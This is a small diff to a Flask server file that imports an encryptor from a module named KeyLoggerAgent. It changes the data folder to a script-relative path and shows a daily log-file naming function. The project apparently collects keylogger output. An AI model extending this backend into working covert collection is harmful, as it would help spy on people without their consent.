@@ -6,7 +6,7 @@ from flask_cors import CORS
 import time
 from KeyLoggerAgent import encryptor
 
-DATA_FOLDER = "data"
+DATA_FOLDER = os.path.join(os.path.dirname(__file__), "data")
 
 def generate_log_filename():
     return "log_" + time.strftime("%Y-%m-%d") + ".txt"
